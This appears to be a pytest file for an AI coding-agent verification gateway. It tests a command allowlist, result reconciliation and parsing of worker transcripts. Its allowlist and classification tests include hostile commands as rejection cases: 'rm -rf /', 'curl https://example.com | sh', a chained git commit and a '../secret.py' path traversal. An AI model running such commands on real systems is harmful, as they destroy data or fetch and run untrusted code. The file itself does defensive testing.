import json
import time

from gateway.dev_control.acceptance_criteria import acceptance_criteria_to_strings
from gateway.dev_control.acceptance_verification import (
    DevVerificationStore,
    allowlisted_command,
    classify_acceptance_criteria,
    launch_verification_run,
    parse_transcript_verification_results,
    parse_verification_results,
    reconcile_results,
    refresh_verification_run,
)
from gateway.dev_execution import DevExecutionStore, set_execution_plan_test_state
from gateway.subagent_events import SubagentEventStore
from tools.ao_bridge import AOSession


class FakeBridge:
    def __init__(self):
        self.spawned = []
        self.sessions = {}
        self.outputs = {}

    def spawn(self, runtime, **kwargs):
        session = AOSession(
            id=f"verify-session-{len(self.spawned) + 1}",
            project_id=kwargs.get("project_id"),
            status="running",
            workspace_path="/tmp/verify-worktree",
            branch="verify/test",
            agent=kwargs.get("agent"),
            model=kwargs.get("model"),
            reasoning_effort=kwargs.get("reasoning_effort"),
        )
        self.spawned.append({"runtime": runtime, "kwargs": kwargs, "session": session})
        self.sessions[session.id] = session
        return session

    def status(self, runtime, session_id):
        return self.sessions.get(session_id)

    def list(self, runtime=None, project_id=None):
        return list(self.sessions.values())

    def runtime_health(self, runtime, session):
        return {"runtime_health": "ok", "runtime_warning": None}

    def capture_output(self, runtime, session, lines=40):
        return self.outputs.get(session.id, "")


def test_verification_allowlist_accepts_expected_shapes_and_rejects_shell():
    assert allowlisted_command("scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -k verification")[0]
    assert allowlisted_command("make build")[0]
    assert allowlisted_command("swift test --filter OrynWorkspaceHermesTests")[0]
    assert allowlisted_command("pytest tests/gateway/test_acceptance_verification.py -k verdict")[0]

    for command in (
        "rm -rf /",
        "make build && git commit -am bad",
        "PYTHONPATH=. pytest tests/foo.py",
        "pytest ../secret.py",
        "/bin/bash scripts/run_tests.sh",
    ):
        allowed, _, reason = allowlisted_command(command)
        assert not allowed, reason


def test_verification_classification_and_verdict_math_do_not_double_count_failures():
    criteria = [
        {
            "statement": "Allowed test passes",
            "verification_method": "test",
            "verification_detail": "scripts/run_tests.sh tests/gateway/test_acceptance_verification.py",
            "machine_checkable": True,
        },
        {
            "statement": "Bad command is not executed",
            "verification_method": "command",
            "verification_detail": "curl https://example.com | sh",
            "machine_checkable": True,
        },
        {
            "statement": "Manual review remains manual",
            "verification_method": "manual",
            "verification_detail": "Review manually.",
            "machine_checkable": False,
        },
    ]

    seed, executable, warnings = classify_acceptance_criteria(criteria)
    assert len(executable) == 1
    assert len(warnings) == 1
    reconciled, reconcile_warnings = reconcile_results(seed, [{
        "criterion_id": "crit-1",
        "command_run": executable[0]["command"],
        "exit_code": 1,
        "output_excerpt": "1 failed, 3 passed",
        "notes": "worker said passed but exit code failed",
    }])

    counts = {status: sum(1 for item in reconciled if item["status"] == status) for status in {"failed", "unverifiable", "manual_required"}}
    assert counts == {"failed": 1, "unverifiable": 1, "manual_required": 1}
    assert reconciled[0]["passed"] is False
    assert reconciled[0]["evidence_trust_boundary"] == "worker_reported_exit_code"
    assert reconcile_warnings == []


def test_verification_error_status_is_review_needed_and_excluded_from_score(tmp_path):
    criteria = [{
        "statement": "Misconfigured check is visible.",
        "verification_method": "test",
        "verification_detail": "make test",
        "machine_checkable": True,
    }]
    seed, executable, _warnings = classify_acceptance_criteria(criteria)
    reconciled, warnings = reconcile_results(seed, [{
        "criterion_id": "crit-1",
        "command_run": executable[0]["command"],
        "exit_code": 127,
        "output_excerpt": "pytest: command not found",
        "notes": "",
    }])
    store = DevVerificationStore(tmp_path / "state.db")
    run = store.create_run(
        plan_id="plan",
        task_id="task",
        target_type="task",
        status="completed",
        results=reconciled,
        executable_commands=executable,
        verified_against={},
        warnings=warnings,
    )
    assert run["counts"]["error"] == 1
    assert run["counts"]["passed"] == 0
    assert run["counts"]["failed"] == 0
    assert run["acceptance_verification_score"] is None
    assert run["verdict"] == "needs_review"


def test_verification_keeps_ambiguous_usage_output_as_failed():
    criteria = [{
        "statement": "Ambiguous test failure remains failed.",
        "verification_method": "test",
        "verification_detail": "pytest tests/example.py",
        "machine_checkable": True,
    }]
    seed, executable, _warnings = classify_acceptance_criteria(criteria)
    reconciled, _ = reconcile_results(seed, [{
        "criterion_id": "crit-1",
        "command_run": executable[0]["command"],
        "exit_code": 2,
        "output_excerpt": "Usage: pytest [options] [file_or_dir] 1 failed",
        "notes": "",
    }])
    assert reconciled[0]["status"] == "failed"


def test_verification_parser_requires_raw_results_block():
    parsed = parse_verification_results("""
    Summary
    ```json DEV_VERIFICATION_RESULTS
    {"object":"hermes.dev_verification_results","results":[{"criterion_id":"crit-1","command_run":"make build","exit_code":0,"output_excerpt":"Build complete!","notes":""}]}
    ```
    """)
    assert parsed["status"] == "ok"
    assert parsed["results"][0]["exit_code"] == 0


def test_verification_reconciles_when_runtime_terminal_even_with_nonterminal_event(tmp_path):
    db_path = tmp_path / "state.db"
    execution_store = DevExecutionStore(db_path)
    event_store = SubagentEventStore(db_path)
    verification_store = DevVerificationStore(db_path)
    bridge = FakeBridge()
    criteria = acceptance_criteria_to_strings([{
        "statement": "The verification command passes.",
        "verification_method": "test",
        "verification_detail": "scripts/run_tests.sh tests/gateway/test_acceptance_verification.py",
        "machine_checkable": True,
    }])
    plan = execution_store.create_plan(
        title="Terminal runtime detection",
        vision_brief=None,
        tasks=[{
            "goal": "Implemented task",
            "prompt": "Do the implementation.",
            "profile_id": "workspace.implement",
            "project_id": "OrynWorkspace",
            "permissions": "edit",
            "acceptance_criteria": criteria,
        }],
    )
    task_id = plan["tasks"][0]["task_id"]
    set_execution_plan_test_state(
        store=execution_store,
        plan_id=plan["plan_id"],
        task_id=task_id,
        state="completed_ok",
        event_store=event_store,
        ao_session_id="implemented-session",
    )
    run = launch_verification_run(
        execution_store=execution_store,
        verification_store=verification_store,
        plan_id=plan["plan_id"],
        task_id=task_id,
        bridge=bridge,
        event_store=event_store,
    )
    bridge.sessions[run["verification_session_id"]].status = "done"
    event_store.append_event({
        "event": "subagent.output",
        "subagent_id": f"ao:{run['verification_session_id']}",
        "ao_session_id": run["verification_session_id"],
        "status": "working",
        "summary": (
            "Worker stopped with useful output\n"
            "```json DEV_VERIFICATION_RESULTS\n"
            + json.dumps({
                "object": "hermes.dev_verification_results",
                "results": [{
                    "criterion_id": "crit-1",
                    "command_run": run["executable_commands"][0]["command"],
                    "cwd": run["executable_commands"][0]["relative_cwd"],
                    "exit_code": 0,
                    "output_excerpt": "1 passed in 0.1s",
                    "notes": "",
                }],
            })
            + "\n```"
        ),
    })

    refreshed = refresh_verification_run(
        verification_store=verification_store,
        verification_run_id=run["verification_run_id"],
        event_store=event_store,
        bridge=bridge,
    )
    assert refreshed["status"] == "completed"
    assert refreshed["verdict"] == "verified"


def test_verification_refresh_recovers_transcript_before_runtime_terminal(tmp_path):
    db_path = tmp_path / "state.db"
    execution_store = DevExecutionStore(db_path)
    event_store = SubagentEventStore(db_path)
    verification_store = DevVerificationStore(db_path)
    bridge = FakeBridge()
    criteria = acceptance_criteria_to_strings([{
        "statement": "The verification command runs.",
        "verification_method": "test",
        "verification_detail": "make test",
        "machine_checkable": True,
    }])
    plan = execution_store.create_plan(
        title="Running verification transcript recovery",
        vision_brief=None,
        tasks=[{
            "goal": "Implemented task",
            "prompt": "Do the implementation.",
            "profile_id": "workspace.implement",
            "project_id": "OrynWorkspace",
            "permissions": "edit",
            "acceptance_criteria": criteria,
        }],
    )
    task_id = plan["tasks"][0]["task_id"]
    set_execution_plan_test_state(
        store=execution_store,
        plan_id=plan["plan_id"],
        task_id=task_id,
        state="completed_ok",
        event_store=event_store,
        ao_session_id="implemented-session",
    )
    run = launch_verification_run(
        execution_store=execution_store,
        verification_store=verification_store,
        plan_id=plan["plan_id"],
        task_id=task_id,
        bridge=bridge,
        event_store=event_store,
    )
    session = bridge.sessions[run["verification_session_id"]]
    session.status = "running"
    bridge.outputs[session.id] = "\n".join([
        "Final output is mandatory: return this template:",
        "```json DEV_VERIFICATION_RESULTS",
        '{"object":"hermes.dev_verification_results","results":[{"criterion_id":"crit-1","command_run":"make test","exit_code":0,"output_excerpt":"include the real test/build summary line","notes":""}]}',
        "```",
        "Ran make test",
        "1 failed in 0.1s",
        "make test exited with code 1.",
    ])

    refreshed = refresh_verification_run(
        verification_store=verification_store,
        verification_run_id=run["verification_run_id"],
        event_store=event_store,
        bridge=bridge,
    )
    assert refreshed["status"] == "completed"
    assert refreshed["verdict"] == "failed"
    assert refreshed["counts"]["failed"] == 1
    assert refreshed["results"][0]["exit_code"] == 1


def test_verification_recovers_wrapped_command_from_criterion_exit_line():
    transcript = """
Verification completed. crit-1 exited 0; summary line confirms 22 tests
passed.

{
  "object": "hermes.dev_verification_results",
  "results": [
    {
      "criterion_id": "crit-1",
      "command_run": "scripts/run_tests.sh tests/gateway/
test_api_server_runs.py -- -q",
      "cwd": ".",
      "exit_code": 0,
      "output_excerpt": "=== Summary: 1 files, 22 tests passed, 0 failed (0%
complete) in 3.7s (28 workers) ===",
      "notes": ""
    }
  ]
}
"""

    parsed = parse_transcript_verification_results(
        transcript,
        [{"criterion_id": "crit-1", "command": "scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q"}],
    )

    assert parsed["results"][0]["criterion_id"] == "crit-1"
    assert parsed["results"][0]["exit_code"] == 0
    assert "22 tests" in parsed["results"][0]["output_excerpt"]


def test_verification_recovers_successful_exit_code_phrase():
    transcript = """
• Ran scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q
• Verification completed. The allowed command exited successfully with code 0.

=== Summary: 1 files, 22 tests passed, 0 failed (0% complete) in 3.0s (28 workers) ===
"""

    parsed = parse_transcript_verification_results(
        transcript,
        [{"criterion_id": "crit-1", "command": "scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q"}],
    )

    assert parsed["results"][0]["criterion_id"] == "crit-1"
    assert parsed["results"][0]["exit_code"] == 0
    assert "22 tests passed" in parsed["results"][0]["output_excerpt"]


def test_verification_transcript_recovery_skips_prompt_template_and_reads_json_exit_code():
    transcript = """
Allowed commands:
- crit-1: scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q

Final output is mandatory. Set exit_code to the real process exit code.
```json DEV_VERIFICATION_RESULTS
{"object":"hermes.dev_verification_results","results":[{"criterion_id":"crit-1","command_run":"scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q","exit_code":0,"output_excerpt":"include the real test/build summary line","notes":""}]}
```

• Ran scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q
  └ error: no virtualenv found in /Users/felipelamartine/.oryn-lab/.worktrees/
    HermesAgentLab/lab-hermes-agent-90/.venv or /Users/felipelamartine/.oryn-lab/.worktrees/HermesAgentLab/lab-hermes-agent-90/venv

{
  "object": "hermes.dev_verification_results",
  "results": [
    {
      "criterion_id": "crit-1",
      "command_run": "scripts/run_tests.sh tests/gateway/
test_api_server_runs.py -- -q",
      "cwd": ".",
      "exit_code": 1,
      "output_excerpt": "error: no virtualenv found in /Users/felipelamartine/.oryn-lab/.worktrees/HermesAgentLab/lab-hermes-agent-90/.venv or /Users/felipelamartine/.oryn-lab/.worktrees/HermesAgentLab/lab-hermes-agent-90/venv",
      "notes": ""
    }
  ]
}
"""

    parsed = parse_transcript_verification_results(
        transcript,
        [{"criterion_id": "crit-1", "command": "scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q"}],
    )

    assert parsed["results"][0]["criterion_id"] == "crit-1"
    assert parsed["results"][0]["exit_code"] == 1
    assert "no virtualenv found" in parsed["results"][0]["output_excerpt"]


def test_verification_unfenced_parser_prefers_latest_results_object():
    transcript = """
{
  "object": "hermes.dev_verification_results",
  "results": [{
    "criterion_id": "crit-1",
    "command_run": "scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q",
    "cwd": ".",
    "exit_code": 0,
    "output_excerpt": "include the real test/build summary line",
    "notes": ""
  }]
}

{
  "object": "hermes.dev_verification_results",
  "results": [{
    "criterion_id": "crit-1",
    "command_run": "scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q",
    "cwd": ".",
    "exit_code": 0,
    "output_excerpt": "=== Summary: 1 files, 22 tests passed, 0 failed (0% complete) in 3.0s (28 workers) ===",
    "notes": ""
  }]
}
"""

    parsed = parse_verification_results(transcript)

    assert parsed["results"][0]["exit_code"] == 0
    assert "include the real" not in parsed["results"][0]["output_excerpt"]


def test_refresh_prefers_codex_final_message_over_terminal_ui_transcript(tmp_path, monkeypatch):
    db_path = tmp_path / "state.db"
    verification_store = DevVerificationStore(db_path)
    event_store = SubagentEventStore(db_path)
    bridge = FakeBridge()
    workspace = tmp_path / "worktree"
    workspace.mkdir()
    session = AOSession(
        id="verify-codex-session",
        status="completed",
        workspace_path=str(workspace),
        branch="verify/codex-final",
        agent="codex",
        model="gpt-5.5",
    )
    bridge.sessions[session.id] = session
    executable = [{
        "criterion_id": "crit-1",
        "statement": "Smoke tests pass.",
        "verification_method": "test",
        "command": "scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q",
        "cwd": ".",
        "relative_cwd": ".",
    }]
    seed_results = [{
        "criterion_id": "crit-1",
        "statement": "Smoke tests pass.",
        "verification_method": "test",
        "verification_detail": executable[0]["command"],
        "machine_checkable": True,
        "status": "pending",
        "passed": None,
        "warnings": [],
    }]
    run = verification_store.create_run(
        plan_id="plan",
        task_id="task",
        target_type="task",
        status="launched",
        results=seed_results,
        executable_commands=executable,
        verified_against={"workspace_path": str(workspace)},
        verification_session_id=session.id,
        verification_runtime="ao",
        worker_launch_profile_id="workspace.test",
    )
    bridge.outputs[session.id] = """
```json DEV_VERIFICATION_RESULTS
{
  "object": "hermes.dev_verification_results",
  "results": [
    {
      "criterion_id": "crit-1",
      "command_run": "scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q",
      "cwd": ".",
      "exit_code": 0,
      "output_excerpt": "2.87s  tests/gateway/test_api_server_runs.py
• Working (8s • esc to interrupt)",
      "notes": ""
    }
  ]
}
```
"""
    codex_home = tmp_path / ".codex"
    sessions_dir = codex_home / "sessions" / "2026" / "05" / "30"
    sessions_dir.mkdir(parents=True)
    final_message = (
        "Verification command completed with exit code 0.\n\n"
        "```json DEV_VERIFICATION_RESULTS\n"
        + json.dumps({
            "object": "hermes.dev_verification_results",
            "results": [{
                "criterion_id": "crit-1",
                "command_run": executable[0]["command"],
                "cwd": ".",
                "exit_code": 0,
                "output_excerpt": "=== Summary: 1 files, 22 tests passed, 0 failed (0% complete) in 2.9s (28 workers) ===",
                "notes": "",
            }],
        }, indent=2)
        + "\n```"
    )
    session_file = sessions_dir / "rollout-2026-05-30T10-10-30-test.jsonl"
    session_file.write_text(
        "\n".join([
            json.dumps({"type": "session_meta", "payload": {"id": "codex-jsonl-session", "cwd": str(workspace)}}),
            json.dumps({"type": "event_msg", "payload": {"type": "task_complete", "last_agent_message": final_message, "completed_at": time.time()}}),
        ]),
        encoding="utf-8",
    )
    monkeypatch.setenv("HERMES_DEV_VERIFICATION_CODEX_HOME", str(codex_home))
    event_store.append_event({
        "event": "subagent.complete",
        "subagent_id": f"ao:{session.id}",
        "ao_session_id": session.id,
        "status": "completed",
        "summary": "Verification session completed.",
    })

    refreshed = refresh_verification_run(
        verification_store=verification_store,
        verification_run_id=run["verification_run_id"],
        event_store=event_store,
        bridge=bridge,
    )

    assert refreshed["status"] == "completed"
    assert refreshed["verdict"] == "verified"
    assert refreshed["warnings"] == []
    assert refreshed["results"][0]["output_excerpt"].startswith("=== Summary: 1 files")
    assert "Working" not in refreshed["results"][0]["output_excerpt"]


def test_refresh_falls_back_to_codex_final_message_by_ao_session_id(tmp_path, monkeypatch):
    db_path = tmp_path / "state.db"
    verification_store = DevVerificationStore(db_path)
    event_store = SubagentEventStore(db_path)
    bridge = FakeBridge()
    workspace = tmp_path / "worktree"
    workspace.mkdir()
    session = AOSession(
        id="verify-ao-session-id-only",
        status="completed",
        workspace_path="",
        branch="verify/codex-final",
        agent="codex",
        model="gpt-5.5",
    )
    bridge.sessions[session.id] = session
    executable = [{
        "criterion_id": "crit-1",
        "statement": "Smoke tests pass.",
        "verification_method": "test",
        "command": "scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q",
        "cwd": ".",
        "relative_cwd": ".",
    }]
    seed_results = [{
        "criterion_id": "crit-1",
        "statement": "Smoke tests pass.",
        "verification_method": "test",
        "verification_detail": executable[0]["command"],
        "machine_checkable": True,
        "status": "pending",
        "passed": None,
        "warnings": [],
    }]
    run = verification_store.create_run(
        plan_id="plan",
        task_id="task",
        target_type="task",
        status="launched",
        results=seed_results,
        executable_commands=executable,
        verified_against={"workspace_path": str(workspace)},
        verification_session_id=session.id,
        verification_runtime="ao",
        worker_launch_profile_id="workspace.test",
    )
    bridge.outputs[session.id] = """
```json DEV_VERIFICATION_RESULTS
{
  "object": "hermes.dev_verification_results",
  "results": [
    {
      "criterion_id": "crit-1",
      "command_run": "scripts/run_tests.sh tests/gateway/test_api_server_runs.py -- -q",
      "cwd": ".",
      "exit_code": 0,
      "output_excerpt": "2.87s  tests/gateway/test_api_server_runs.py
• Working (8s • esc to interrupt)",
      "notes": ""
    }
  ]
}
```
"""
    codex_home = tmp_path / ".codex"
    sessions_dir = codex_home / "sessions" / "2026" / "05" / "30"
    sessions_dir.mkdir(parents=True)
    final_message = (
        f"AO verification session {session.id} completed with exit code 0.\n\n"
        "```json DEV_VERIFICATION_RESULTS\n"
        + json.dumps({
            "object": "hermes.dev_verification_results",
            "results": [{
                "criterion_id": "crit-1",
                "command_run": executable[0]["command"],
                "cwd": ".",
                "exit_code": 0,
                "output_excerpt": "=== Summary: 1 files, 22 tests passed, 0 failed (0% complete) in 2.9s (28 workers) ===",
                "notes": "",
            }],
        }, indent=2)
        + "\n```"
    )
    session_file = sessions_dir / "rollout-2026-05-30T10-11-30-test.jsonl"
    session_file.write_text(
        "\n".join([
            json.dumps({"type": "session_meta", "payload": {"id": "codex-jsonl-session", "cwd": str(tmp_path / "other-worktree")}}),
            json.dumps({"type": "event_msg", "payload": {"type": "message", "message": f"tracking {session.id}"}}),
            json.dumps({"type": "event_msg", "payload": {"type": "task_complete", "last_agent_message": final_message, "completed_at": time.time()}}),
        ]),
        encoding="utf-8",
    )
    monkeypatch.setenv("HERMES_DEV_VERIFICATION_CODEX_HOME", str(codex_home))
    event_store.append_event({
        "event": "subagent.complete",
        "subagent_id": f"ao:{session.id}",
        "ao_session_id": session.id,
        "status": "completed",
        "summary": "Verification session completed.",
    })

    refreshed = refresh_verification_run(
        verification_store=verification_store,
        verification_run_id=run["verification_run_id"],
        event_store=event_store,
        bridge=bridge,
    )

    assert refreshed["status"] == "completed"
    assert refreshed["verdict"] == "verified"
    assert refreshed["warnings"] == []
    assert refreshed["results"][0]["output_excerpt"].startswith("=== Summary: 1 files")
    assert "Working" not in refreshed["results"][0]["output_excerpt"]


def test_verification_recovers_missing_fence_and_classifies_unrunnable_as_error(tmp_path):
    db_path = tmp_path / "state.db"
    execution_store = DevExecutionStore(db_path)
    event_store = SubagentEventStore(db_path)
    verification_store = DevVerificationStore(db_path)
    bridge = FakeBridge()
    criteria = acceptance_criteria_to_strings([{
        "statement": "The verification command runs.",
        "verification_method": "test",
        "verification_detail": "make test",
        "machine_checkable": True,
    }])
    plan = execution_store.create_plan(
        title="Fallback transcript parsing",
        vision_brief=None,
        tasks=[{
            "goal": "Implemented task",
            "prompt": "Do the implementation.",
            "profile_id": "workspace.implement",
            "project_id": "OrynWorkspace",
            "permissions": "edit",
            "acceptance_criteria": criteria,
        }],
    )
    task_id = plan["tasks"][0]["task_id"]
    set_execution_plan_test_state(
        store=execution_store,
        plan_id=plan["plan_id"],
        task_id=task_id,
        state="completed_ok",
        event_store=event_store,
        ao_session_id="implemented-session",
    )
    run = launch_verification_run(
        execution_store=execution_store,
        verification_store=verification_store,
        plan_id=plan["plan_id"],
        task_id=task_id,
        bridge=bridge,
        event_store=event_store,
    )
    session = bridge.sessions[run["verification_session_id"]]
    session.status = "done"
    bridge.outputs[session.id] = "\n".join([
        "Ran make test",
        "make: *** No rule to make target `test'.  Stop.",
        "make test exited with code 2.",
    ])

    refreshed = refresh_verification_run(
        verification_store=verification_store,
        verification_run_id=run["verification_run_id"],
        event_store=event_store,
        bridge=bridge,
    )
    assert refreshed["status"] == "completed"
    assert refreshed["verdict"] == "needs_review"
    assert refreshed["acceptance_verification_score"] is None
    assert refreshed["counts"]["error"] == 1
    assert refreshed["results"][0]["status"] == "error"
    assert refreshed["results"][0]["relative_cwd"] == "apps/oryn-workspace"


def test_verification_unrecoverable_completed_output_needs_attention(tmp_path):
    db_path = tmp_path / "state.db"
    execution_store = DevExecutionStore(db_path)
    event_store = SubagentEventStore(db_path)
    verification_store = DevVerificationStore(db_path)
    bridge = FakeBridge()
    criteria = acceptance_criteria_to_strings([{
        "statement": "The verification command runs.",
        "verification_method": "test",
        "verification_detail": "make build",
        "machine_checkable": True,
    }])
    plan = execution_store.create_plan(
        title="Unparseable verification output",
        vision_brief=None,
        tasks=[{
            "goal": "Implemented task",
            "prompt": "Do the implementation.",
            "profile_id": "workspace.implement",
            "project_id": "OrynWorkspace",
            "permissions": "edit",
            "acceptance_criteria": criteria,
        }],
    )
    task_id = plan["tasks"][0]["task_id"]
    set_execution_plan_test_state(
        store=execution_store,
        plan_id=plan["plan_id"],
        task_id=task_id,
        state="completed_ok",
        event_store=event_store,
        ao_session_id="implemented-session",
    )
    run = launch_verification_run(
        execution_store=execution_store,
        verification_store=verification_store,
        plan_id=plan["plan_id"],
        task_id=task_id,
        bridge=bridge,
        event_store=event_store,
    )
    session = bridge.sessions[run["verification_session_id"]]
    session.status = "done"
    bridge.outputs[session.id] = "I ran checks but did not report usable evidence."

    refreshed = refresh_verification_run(
        verification_store=verification_store,
        verification_run_id=run["verification_run_id"],
        event_store=event_store,
        bridge=bridge,
    )
    assert refreshed["status"] == "needs_attention"
    assert refreshed["warnings"]


def test_verification_launched_timeout_needs_attention(tmp_path, monkeypatch):
    db_path = tmp_path / "state.db"
    verification_store = DevVerificationStore(db_path)
    run = verification_store.create_run(
        plan_id="plan",
        task_id="task",
        target_type="task",
        status="launched",
        results=[{
            "criterion_id": "crit-1",
            "statement": "Pending check.",
            "verification_method": "test",
            "verification_detail": "make build",
            "machine_checkable": True,
            "status": "pending",
            "command_run": "make build",
            "exit_code": None,
            "passed": None,
            "output_excerpt": "",
            "notes": "",
            "warnings": [],
        }],
        executable_commands=[{"criterion_id": "crit-1", "command": "make build"}],
        verified_against={},
        verification_session_id="missing-session",
    )
    verification_store.update_run(run["verification_run_id"], {"created_at": time.time() - 10})
    monkeypatch.setenv("HERMES_DEV_VERIFICATION_LAUNCHED_TIMEOUT_SECONDS", "1")

    refreshed = refresh_verification_run(
        verification_store=verification_store,
        verification_run_id=run["verification_run_id"],
        event_store=SubagentEventStore(db_path),
    )
    assert refreshed["status"] == "needs_attention"
    assert "timeout" in " ".join(refreshed["warnings"]).lower()


def test_verification_launch_uses_verify_profile_and_refreshes_from_worker_output(tmp_path):
    db_path = tmp_path / "state.db"
    execution_store = DevExecutionStore(db_path)
    event_store = SubagentEventStore(db_path)
    verification_store = DevVerificationStore(db_path)
    bridge = FakeBridge()
    criteria = acceptance_criteria_to_strings([{
        "statement": "The verification command passes.",
        "verification_method": "test",
        "verification_detail": "scripts/run_tests.sh tests/gateway/test_acceptance_verification.py",
        "machine_checkable": True,
    }])
    plan = execution_store.create_plan(
        title="Verify plan",
        vision_brief=None,
        tasks=[{
            "goal": "Implemented task",
            "prompt": "Do the implementation.",
            "profile_id": "workspace.implement",
            "project_id": "OrynWorkspace",
            "permissions": "edit",
            "acceptance_criteria": criteria,
        }],
    )
    task_id = plan["tasks"][0]["task_id"]
    set_execution_plan_test_state(
        store=execution_store,
        plan_id=plan["plan_id"],
        task_id=task_id,
        state="completed_ok",
        event_store=event_store,
        ao_session_id="implemented-session",
        files_written=["Sources/Changed.swift"],
        verification_evidence=["self-reported"],
    )

    run = launch_verification_run(
        execution_store=execution_store,
        verification_store=verification_store,
        plan_id=plan["plan_id"],
        task_id=task_id,
        bridge=bridge,
        event_store=event_store,
    )

    assert run["status"] == "launched"
    assert run["worker_launch_profile_id"] == "workspace.test"
    assert bridge.spawned[0]["runtime"] == "ao"
    assert "DEV_VERIFICATION_RESULTS" in bridge.spawned[0]["kwargs"]["prompt"]
    assert "apps/oryn-workspace" in bridge.spawned[0]["kwargs"]["prompt"]
    assert "/Users/" not in bridge.spawned[0]["kwargs"]["prompt"]
    assert "Do not edit source files" in bridge.spawned[0]["kwargs"]["prompt"]
    assert "valid JSON" in bridge.spawned[0]["kwargs"]["prompt"]
    assert "Do not paste raw multi-line command output inside a JSON string" in bridge.spawned[0]["kwargs"]["prompt"]
    assert "escape any newline as \\n" in bridge.spawned[0]["kwargs"]["prompt"]
    prompt_meta = event_store.get_ao_prompt(run["verification_session_id"])
    assert prompt_meta["permissions"] == "verify"
    assert prompt_meta["launch_profile_id"] == "workspace.test"
    assert prompt_meta["launch_task_id"].endswith(":verification")
    assert run["verified_against"]["tracked_diff"] is True
    assert run["verified_against"]["verification_relative_cwd"] == "apps/oryn-workspace"
    assert run["executable_commands"][0]["relative_cwd"] == "apps/oryn-workspace"

    event_store.append_event({
        "event": "subagent.complete",
        "subagent_id": f"ao:{run['verification_session_id']}",
        "ao_session_id": run["verification_session_id"],
        "status": "completed",
        "summary": (
            "Verification complete\n"
            "```json DEV_VERIFICATION_RESULTS\n"
            + json.dumps({
                "object": "hermes.dev_verification_results",
                "results": [{
                    "criterion_id": "crit-1",
                    "command_run": run["executable_commands"][0]["command"],
                    "exit_code": 0,
                    "output_excerpt": "1 passed in 0.1s",
                    "notes": "",
                }],
            })
            + "\n```"
        ),
    })
    refreshed = refresh_verification_run(
        verification_store=verification_store,
        verification_run_id=run["verification_run_id"],
        event_store=event_store,
    )
    assert refreshed["status"] == "completed"
    assert refreshed["verdict"] == "verified"
    assert refreshed["acceptance_verification_score"] == 1.0
    assert refreshed["results"][0]["relative_cwd"] == "apps/oryn-workspace"


def test_verification_launch_rejects_active_task(tmp_path):
    db_path = tmp_path / "state.db"
    execution_store = DevExecutionStore(db_path)
    verification_store = DevVerificationStore(db_path)
    plan = execution_store.create_plan(
        title="Verify plan",
        vision_brief=None,
        tasks=[{
            "goal": "Still running",
            "prompt": "Do the implementation.",
            "profile_id": "workspace.implement",
            "project_id": "OrynWorkspace",
            "permissions": "edit",
            "acceptance_criteria": ["Plain manual criterion."],
        }],
    )
    task_id = plan["tasks"][0]["task_id"]

    try:
        launch_verification_run(
            execution_store=execution_store,
            verification_store=verification_store,
            plan_id=plan["plan_id"],
            task_id=task_id,
            bridge=FakeBridge(),
            event_store=None,
        )
    except ValueError as exc:
        assert "not idle/completed" in str(exc)
    else:
        raise AssertionError("active/planned task verification should be rejected")


def test_verification_launch_rejects_active_same_worktree(tmp_path):
    db_path = tmp_path / "state.db"
    execution_store = DevExecutionStore(db_path)
    event_store = SubagentEventStore(db_path)
    verification_store = DevVerificationStore(db_path)
    bridge = FakeBridge()
    criteria = acceptance_criteria_to_strings([{
        "statement": "The verification command passes.",
        "verification_method": "test",
        "verification_detail": "make test",
        "machine_checkable": True,
    }])
    plan = execution_store.create_plan(
        title="Verify idle worktree",
        vision_brief=None,
        tasks=[
            {
                "goal": "Completed implementation",
                "prompt": "Do the implementation.",
                "profile_id": "workspace.implement",
                "project_id": "OrynWorkspace",
                "permissions": "edit",
                "acceptance_criteria": criteria,
            },
            {
                "goal": "Still running implementation",
                "prompt": "Keep working.",
                "profile_id": "workspace.implement",
                "project_id": "OrynWorkspace",
                "permissions": "edit",
                "acceptance_criteria": criteria,
            },
        ],
    )
    target_task_id = plan["tasks"][0]["task_id"]
    active_task_id = plan["tasks"][1]["task_id"]
    set_execution_plan_test_state(
        store=execution_store,
        plan_id=plan["plan_id"],
        task_id=target_task_id,
        state="completed_ok",
        event_store=event_store,
        ao_session_id="implemented-session",
    )
    set_execution_plan_test_state(
        store=execution_store,
        plan_id=plan["plan_id"],
        task_id=active_task_id,
        state="running",
        event_store=event_store,
        ao_session_id="active-session",
    )
    bridge.sessions["implemented-session"] = AOSession(
        id="implemented-session",
        project_id="OrynWorkspace",
        status="completed",
        workspace_path="/tmp/shared-worktree",
    )
    bridge.sessions["active-session"] = AOSession(
        id="active-session",
        project_id="OrynWorkspace",
        status="running",
        workspace_path="/tmp/shared-worktree",
    )
    event_store.append_event({
        "event": "subagent.complete",
        "subagent_id": f"fixture:{target_task_id}",
        "ao_session_id": "implemented-session",
        "launch_plan_id": plan["plan_id"],
        "launch_task_id": target_task_id,
        "status": "completed",
        "summary": "Completed in shared worktree.",
        "workspace_path": "/tmp/shared-worktree",
    })
    event_store.append_event({
        "event": "subagent.progress",
        "subagent_id": f"fixture:{active_task_id}",
        "ao_session_id": "active-session",
        "launch_plan_id": plan["plan_id"],
        "launch_task_id": active_task_id,
        "status": "running",
        "summary": "Still active in shared worktree.",
        "workspace_path": "/tmp/shared-worktree",
    })

    try:
        launch_verification_run(
            execution_store=execution_store,
            verification_store=verification_store,
            plan_id=plan["plan_id"],
            task_id=target_task_id,
            bridge=bridge,
            event_store=event_store,
        )
    except ValueError as exc:
        assert "still in use by active task" in str(exc)
    else:
        raise AssertionError("verification should wait for an idle shared worktree")
